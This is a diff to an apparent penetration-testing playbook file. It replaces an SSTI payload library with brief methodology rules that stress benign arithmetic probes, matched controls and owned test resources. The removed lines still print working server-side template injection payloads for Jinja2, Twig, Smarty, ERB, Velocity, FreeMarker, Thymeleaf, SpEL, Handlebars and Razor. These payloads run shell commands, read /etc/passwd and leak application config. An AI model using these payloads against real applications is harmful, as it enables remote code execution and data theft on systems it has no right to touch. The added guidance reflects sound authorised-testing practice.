@@ -1,105 +1,26 @@
-# PAYLOADS — SSTI — By Engine
+# Context payload lookup: ssti all engines
 
-> Moved from payloads/SKILL.md during the 2026-09-19 playbook split. Load on demand only.
+Canonical guide: [ssti_all_engines.md](../../web-mode/SKILL_FILES/VULNERABILITIES/WEB/ssti_all_engines.md).
 
-## 4. SSTI — By Engine
+This entry point contains selection rules, not a second payload library. Load the
+canonical guide's experiment and payload sections; its controls, preconditions,
+source/version limits and interpretation travel with every example.
 
-### DETECTION
-```
-${7*7}            # Java EL, FreeMarker
-{{7*7}}           # Jinja2, Twig, Liquid, Handlebars (output)
-<%= 7*7 %>        # ERB, ASP.NET inline
-#{7*7}            # Ruby, Pebble
-@{7*7}            # Razor (Razor uses @ but not arithmetic in this form; check context)
-{7*'7'}           # JS, possibly Smarty
-*{7*7}            # Thymeleaf
-${{7*7}}          # combo probe
-%{7*7}            # Velocity (some)
-```
+## Select the experiment
 
-### JINJA2 / FLASK
-```
-{{7*7}}                                                                # 49
-{{config}}                                                             # leak app config
-{{config.items()}}
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-{{''.__class__.__mro__[1].__subclasses__()}}     # find Popen
-{{''.__class__.__mro__[1].__subclasses__()[<idx>]("id",shell=True,stdout=-1).communicate()}}
-{{cycler.__init__.__globals__.os.popen('id').read()}}
-{{lipsum.__globals__['os'].popen('id').read()}}
-{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}
-```
+- Contexts: Expression syntax / engine / sandbox / accessible objects.
+- Use benign arithmetic or string markers with a literal control. An engine must actually support the expression; template evaluation is not proof of operating-system command execution.
+- Name the input source, decoder/parser and expected security boundary first.
+- Discovery may use a cheap justified probe before any primitive is confirmed.
+- Choose a valid baseline, a minimally changed probe, and a matched negative control.
+- Substitute only owned actor/resource IDs and a unique `AUDIT_MARKER`.
+- Preserve the real parser bytes and any required URL/base64/JSON encoding.
+- Record a denied request as the tested observation; do not certify the whole class.
+- An observed source example is not a vendor-wide working payload or target proof.
 
-### TWIG (PHP) / SMARTY
-```
-{{7*7}}
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-{{['id']|filter('system')}}
-{{['cat /etc/passwd']|map('system')|join}}
+## Return to the owning methodology
 
-{$smarty.version}
-{php}phpinfo();{/php}                 # if {php} tag enabled
-{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php phpinfo();?>",self::clearConfig())}
-{system('id')}                         # SmartyBC
-```
-
-### ERB / RAILS / VELOCITY / FREEMARKER
-```
-<%= 7*7 %>
-<%= system('id') %>
-<%= `id` %>
-<%= File.open('/etc/passwd').read %>
-<%= eval(params[:p]) %>
-
-#set($x="")
-#set($r=$x.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))
-#set($p=$r.exec("id"))
-#set($i=$p.getInputStream())
-#set($r2=$x.getClass().forName("java.util.Scanner").getDeclaredConstructor($i.getClass()).newInstance($i).useDelimiter("\\\\A"))
-$r2.next()
-
-${"freemarker.template.utility.Execute"?new()("id")}
-<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
-```
-
-### THYMELEAF / PEBBLE / SPRING SpEL
-```
-*{T(java.lang.Runtime).getRuntime().exec('id')}
-*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
-
-{{ variable.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(null,'id') }}
-
-T(java.lang.Runtime).getRuntime().exec('id')
-new ProcessBuilder({'id'}).start()
-```
-
-### HANDLEBARS (NODE)
-```
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return require('child_process').execSync('id');"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
-```
-
-### RAZOR (.NET)
-```
-@(1+1)
-@System.Diagnostics.Process.Start("cmd.exe","/c calc")
-```
-
----
+If no example fits the observed sink, reason from that sink or current primary
+research rather than loading unrelated variants. If the application rejects the
+probe, discriminate parsing, reachability, authorization and delivery failure
+before either expanding or closing the hypothesis.
